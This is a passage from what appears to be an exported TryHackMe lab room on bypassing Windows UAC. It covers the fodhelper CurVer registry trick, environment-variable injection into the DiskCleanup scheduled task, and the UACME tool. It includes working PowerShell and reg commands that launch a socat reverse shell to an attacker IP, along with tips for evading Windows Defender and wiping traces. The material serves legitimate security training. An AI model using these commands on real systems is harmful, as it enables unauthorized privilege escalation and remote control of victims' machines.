style="font-size:1rem">Depending on your luck, fodhelper might execute before the AV kicks in, giving you back a reverse shell. If for some reason it doesn\'t work for you, keep in mind that this method is unreliable as it depends on a race between the AV and your payload executing first. Should the reverse shell not work, just go ahead and continue with the rest of the room, as a more consistent way to bypass Windows Defender will be given below.</span><br /></p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Attacker\'s Shell\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">user@kali$ nc -lvp 4444      \nListening on 0.0.0.0 4444\nConnection received on 10.10.183.127 49813\nMicrosoft Windows [Version 10.0.17763.1821]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;whoami /groups | find "Label"\nMandatory Label\\High Mandatory Level                          Label            S-1-16-12288</code>\n        </pre>\n    </div>\n</div>\n<p><span style="font-size:1rem">Windows Defender still alerts about the bypass, however. The problem with our current exploit is that it gives little room for variation, as we need to write specific registry keys for it to trigger, making it easy for Windows Defender to detect. But there is still something to be done about it.</span><br /></p><p><br /></p>\n<h3>Improving the fodhelper exploit</h3>\n<p>A variation on the fodhelper exploit was proposed by <a class="external-link" href="https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses" target="_blank">@V3ded</a>, where different registry keys are used, but the basic principle is the same.</p>\n<p>Instead of writing our payload into <code>HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command</code><strong></strong>, we will use the <code>CurVer</code><strong></strong> entry under a progID registry key. This entry is used when you have multiple instances of an application with different versions running on the same system. CurVer allows you to point to the default version of the application to be used by Windows when opening a given file type.</p>\n<p>To this end, we will create an entry on the registry for a new progID of our choice (any name will do) and then point the CurVer entry in the ms-settings progID to our newly created progID. This way, when fodhelper tries opening a file using the ms-settings progID, it will notice the CurVer entry pointing to our new progID and check it to see what command to use.</p>\n<p>The exploit code proposed by @V3ded uses Powershell to achieve this end. Here is a modified version of it adapted to use our reverse shell\xa0<span style="font-size:1rem">(be sure to replace your IP address where needed)</span><span style="font-size:1rem">:</span></p>\n\n<pre><code class="language-powershell">$program = "powershell -windowstyle hidden C:\\tools\\socat\\socat.exe TCP:&lt;attacker_ip&gt;:4445 EXEC:cmd.exe,pipes"\n\nNew-Item "HKCU:\\Software\\Classes\\.pwn\\Shell\\Open\\command" -Force\nSet-ItemProperty "HKCU:\\Software\\Classes\\.pwn\\Shell\\Open\\command" -Name "(default)" -Value $program -Force\n    \nNew-Item -Path "HKCU:\\Software\\Classes\\ms-settings\\CurVer" -Force\nSet-ItemProperty  "HKCU:\\Software\\Classes\\ms-settings\\CurVer" -Name "(default)" -value ".pwn" -Force\n    \nStart-Process "C:\\Windows\\System32\\fodhelper.exe" -WindowStyle Hidden\n</code></pre>\n<p>This exploit creates a new progID with the name <strong>.pwn</strong> and associates our payload to the command used when opening such files. It then points the CurVer entry of ms-settings to our .pwn progID. When fodhelper tries opening an ms-settings program, it will instead be pointed to the .pwn progID and use its associated command.</p>\n<p>This technique is more likely to evade Windows Defender since we have more liberty on where to put our payload, as the name of the progID that holds our payload is entirely arbitrary. Let\'s start a new reverse shell on our attacker\'s machine:</p>\n<pre><code>nc -lvp 4445</code></pre>\n<p>And execute the exploit from our backdoor connection as is. As a result, Windows Defender will throw another alert that references our actions:<img style="text-align:center;font-size:1rem" /></p><p style="text-align:center"><img style="border:1px solid" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/36a12bfed5c44fedf170f934bd4bc9ca.png" /><br /></p>\n<p>Although we are still detected, it is essential to note that sometimes the detection methods used by AV software are implemented strictly against the published exploit, without considering possible variations. If we translate our exploit from Powershell to use cmd.exe, the AV won\'t raise any alerts\xa0<span style="font-size:1rem">(be sure to replace your IP address where needed)</span><span style="font-size:1rem">:</span></p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Command Prompt\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">C:\\&gt; set CMD="powershell -windowstyle hidden C:\\Tools\\socat\\socat.exe TCP:&lt;attacker_ip&gt;:4445 EXEC:cmd.exe,pipes"\n\nC:\\&gt; reg add "HKCU\\Software\\Classes\\.thm\\Shell\\Open\\command" /d %CMD% /f\nThe operation completed successfully.\n\nC:\\&gt; reg add "HKCU\\Software\\Classes\\ms-settings\\CurVer" /d ".thm" /f\nThe operation completed successfully.\n\nC:\\&gt; fodhelper.exe</code>\n        </pre>\n    </div>\n</div>\n\n<p><span style="font-size:1rem">And we get a high integrity reverse shell:</span><br /></p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Attacker\'s Shell\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">user@kali$ nc -lvp 4445      \nListening on 0.0.0.0 4445\nConnection received on 10.10.183.127 23441\nMicrosoft Windows [Version 10.0.17763.1821]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;whoami /groups | find "Label"\nMandatory Label\\High Mandatory Level                          Label            S-1-16-12288</code>\n        </pre>\n    </div>\n</div>\n\n<p>To retrieve the fodhelper-curver flag, use your new shell to execute:</p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Administrator: Command Prompt</div><pre class="terminal-code" style="font-size:14px">           <code class="language-shell-session">C:\\&gt; C:\\flags\\GetFlag-fodhelper-curver.exe</code>\n        </pre></div></div><p><span style="font-weight:bolder">Note: Keep in mind that the flag will only be returned if you </span><b>successfully</b><span style="font-weight:bolder">\xa0bypassed UAC via fodhelper and only from the resulting high integrity shell via socat.</span></p><p><span style="font-weight:bolder"><br /></span></p>\n\n<h3>Clearing our tracks</h3>\n<p>As a result of executing this exploit, some artefacts were created on the target system, such as registry keys. To avoid detection, we need to clean up after ourselves with the following commands:</p>\n<pre><code class="language-batch">reg delete "HKCU\\Software\\Classes\\.thm\\" /f\nreg delete "HKCU\\Software\\Classes\\ms-settings\\" /f</code></pre>\n<p><b>Note: Be sure to execute the given commands to avoid any artefact interfering with the following tasks.</b></p>', 'taskType': 'none', 'taskNo': 5, 'taskCreated': '2022-03-11T05:16:05.317Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What flag is returned by running the fodhelper-curver exploit?', 'hint': ''}]}, {'taskTitle': 'UAC: Environment Variable Expansion', 'taskDesc': '<h3>Bypassing Always Notify</h3>\n<p>As seen in the previous task, on default Windows configurations, you can abuse applications related to the system\'s configuration to bypass UAC as most of these apps have the autoElevate flag set on their manifests. However, if UAC is configured on the "Always Notify" level, fodhelper and similar apps won\'t be of any use as they will require the user to go through the UAC prompt to elevate. This would prevent several known bypass methods to be used, but not all hope is lost. </p>\n<p>For the following technique, we\'ll be abusing a scheduled task that can be run by any user but will execute with the highest privileges available to the caller. Scheduled tasks are an exciting target. By design, they are meant to be run without any user interaction (independent of the UAC security level), so asking the user to elevate a process manually is not an option. Any scheduled tasks that require elevation will automatically get it without going through a UAC prompt.</p><p><br /></p>\n<h3>Case study: Disk Cleanup Scheduled Task</h3>\n<p><strong>Note: Be sure to disable Windows Defender for this task, or you may have some difficulties when running the exploit.\xa0</strong><strong>Just run the provided shortcut on your machine\'s desktop to disable it.</strong></p>\n<p>To understand why we are picking Disk Cleanup, let\'s open the <strong>Task Scheduler</strong> and check the task\'s configuration:</p><p style="text-align:center"><img style="border:1px solid" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/24b5ce8c9a6cb1194ed66054bc2ed09e.png" /><br /></p>\n<p>Here we can see that the task is configured to run with the <strong>Users</strong> account, which means it will inherit the privileges from the calling user. The <strong>Run with highest privileges</strong> option will use the highest privilege security token available to the calling user, which is a high IL token for an administrator. Notice that if a regular non-admin user invokes this task, it will execute with medium IL only since that is the highest privilege token available to non-admins, and therefore the bypass wouldn\'t work.</p>\n<p>Checking the Actions and Settings tabs, we have the following:</p><p style="text-align:center"><img style="width:100%;border:1px solid" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/3b8dd4c6a441eb19620bc3bedd536a8b.png" /><br /></p>\n<p>The task can be run on-demand, executing the following command when invoked:</p><p>\xa0<code>%windir%\\system32\\cleanmgr.exe /autoclean /d %systemdrive%</code></p><p>Since the command depends on environment variables, we might be able to inject commands through them and get them executed by starting the DiskCleanup task manually.</p>\n<p>Luckily for us, we can override the <code>%windir%</code> variable through the registry by creating an entry in <code>HKCU\\Environment</code><strong></strong>. If we want to execute a reverse shell using socat, we can set\xa0<code>%windir%</code>\xa0 as follows (without the quotes):</p>\n<p><code>"cmd.exe /c C:\\tools\\socat\\socat.exe TCP:&lt;attacker_ip&gt;:4445 EXEC:cmd.exe,pipes &amp;REM "</code></p>\n<p>At the end of our command, we concatenate "&amp;REM " (ending with a blank space) to comment whatever is put after <code>%windir%</code> when expanding the environment variable to get the final command used by DiskCleanup. The resulting command would be (be sure to replace your IP address where needed):</p>\n<p><code>cmd.exe /c C:\\tools\\socat\\socat.exe TCP:&lt;attacker_ip&gt;:4445 EXEC:cmd.exe,pipes &amp;REM \\system32\\cleanmgr.exe /autoclean /d %systemdrive%</code></p>\n<p>Where anything after the "REM" is ignored as a comment.</p><p><br /></p>\n<h3>Putting it all together</h3>\n<p>Let\'s set up a listener for a reverse shell with nc:<br />\n<code>nc -lvp 4446</code></p>\n<p>We will then connect to the backdoor provided on port 9999:<br />\n<code>nc MACHINE_IP 9999</code></p>\n<p>And finally, run the following commands to write our payload to <code>%windir%</code> and then execute the DiskCleanup task\xa0<span style="font-size:1rem">(be sure to replace your IP address where needed)</span><span style="font-size:1rem">:</span></p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Command Prompt\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">C:\\&gt; reg add "HKCU\\Environment" /v "windir" /d "cmd.exe /c C:\\tools\\socat\\socat.exe TCP:&lt;attacker_ip&gt;:4446 EXEC:cmd.exe,pipes &amp;REM " /f\n\nC:\\&gt; schtasks /run  /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I</code>\n        </pre>\n    </div>\n</div>\n\n<p>As a result, you should obtain a shell with high IL:</p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Attacker\'s Machine\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">user@kali$ nc -lvp 4446      \nListening on 0.0.0.0 4446\nConnection received on 10.10.183.127 25631\nMicrosoft Windows [Version 10.0.17763.1821]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;whoami /groups | find "Label"\nMandatory Label\\High Mandatory Level                          Label            S-1-16-12288</code>\n        </pre>\n    </div>\n</div>\n<p>To retrieve the DiskCleanup flag, use your new shell to execute:</p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Administrator: Command Prompt\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">C:\\flags\\GetFlag-diskcleanup.exe</code>\n        </pre>\n    </div>\n</div>\n<p><strong>Note: Keep in mind that the flag will only be returned if you successfully bypassed UAC via diskcleanup, and only from the resulting high integrity shell via socat.</strong></p><br />\n\n<h3>Clearing our tracks</h3>\n<p>As a result of executing this exploit, some artefacts were created on the target system, such as registry keys. To avoid detection, we need to clean up after ourselves with the following command:</p>\n<pre><code class="language-batch">reg delete "HKCU\\Environment" /v "windir" /f</code></pre>\n<p><b>Note: Be sure to execute the given command to avoid any artefact interfering with the following tasks. Since many Windows components rely on the %windir% environment variable, a lot of things won\'t\xa0</b><span style="font-weight:bolder;font-size:1rem">properly\xa0</span><b style="font-size:1rem">work until you remove the registry key used for this bypass.</b></p>', 'taskType': 'none', 'taskNo': 6, 'taskCreated': '2022-02-23T02:25:23.671Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What flag is returned by running the DiskCleanup exploit?', 'hint': ''}]}, {'taskTitle': 'Automated Exploitation', 'taskDesc': '<h3>Automating UAC Bypasses</h3>\n<p>An excellent tool is available to test for UAC bypasses without writing your exploits from scratch. Created by @hfiref0x, UACME provides an up to date repository of UAC bypass techniques that can be used out of the box. The tool is available for download at its official repository on:</p>\n<p><a class="external-link" href="https://github.com/hfiref0x/UACME" target="_blank">https://github.com/hfiref0x/UACME</a></p>\n<p>While UACME provides several tools, we will focus mainly on the one called Akagi, which runs the actual UAC bypasses. You can find a compiled version of Akagi under <code>C:\\tools\\UACME-Akagi64.exe</code><strong></strong>.</p>\n<p>Using the tool is straightforward and only requires you to indicate the number corresponding to the method to be tested. A complete list of methods is available on the project\'s GitHub description. If you want to test for method 33, you can do the following from a command prompt, and a high integrity cmd.exe will pop up:</p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Command Prompt\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">Microsoft Windows [Version 10.0.17763.1821]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Users\\attacker&gt;cd /tools\n\nC:\\tools&gt;UACME-Akagi64.exe 33</code>\n        </pre>\n    </div>\n</div>\n<p>The methods introduced through this room can also be tested by UACME by using the following methods:</p><table class="table table-bordered"><thead>\n<tr>\n<th>Method Id</th>\n<th>Bypass technique</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>33</td>\n<td>fodhelper.exe</td>\n</tr>\n<tr>\n<td>34</td>\n<td>DiskCleanup scheduled task</td>\n</tr>\n\n<tr>\n<td>70</td>\n<td>fodhelper.exe using CurVer registry key</td>\n</tr>\n</tbody>\n</table><div class="terminal-container"><div class="terminal-content">\n    </div>\n</div>\n', 'taskType': 'none', 'taskNo': 7, 'taskCreated': '2022-02-23T02:39:08.377Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Click and continue learning!', 'hint': ''}]}, {'taskTitle': 'Conclusion', 'taskDesc': '<p>We have shown several methods to bypass UAC in Windows systems in this room. While most of these methods have automatic tools associated, they will be detected easily by any AV solution on the market if used straight out of the box. Knowing the actual methods will give you an edge as an attacker by allowing you to customize your exploits as needed and make them more evasive.</p>\n<p>As we have seen, UAC isn\'t considered a security boundary and is therefore prone to several bypass methods.</p><p><span style="font-size:1rem">Should you be interested in learning more techniques, the following resources are available:</span><br /></p>\n<ul>\n<li><a href="https://github.com/hfiref0x/UACME" target="_blank">UACME github repository</a></li>\n<li><a href="https://www.bleepingcomputer.com/news/security/bypassing-windows-10-uac-with-mock-folders-and-dll-hijacking/" target="_blank">Bypassing UAC with mock folders and DLL hijacking</a><a class="external-link" href="https://www.bleepingcomputer.com/news/security/bypassing-windows-10-uac-with-mock-folders-and-dll-hijacking/" target="_blank"></a></li><li><a href="https://elastic.github.io/security-research/whitepapers/2022/02/03.exploring-windows-uac-bypass-techniques-detection-strategies/article/" target="_blank">UAC bypass techniques detection strategies</a>\xa0</li><li><a href="https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-1.html" target="_blank">Reading your way around UAC</a><br /></li>\n</ul>', 'taskType': 'none', 'taskNo': 8, 'taskCreated': '2022-02-23T11:13:59.271Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Click and continue learning!', 'hint': ''}]}]}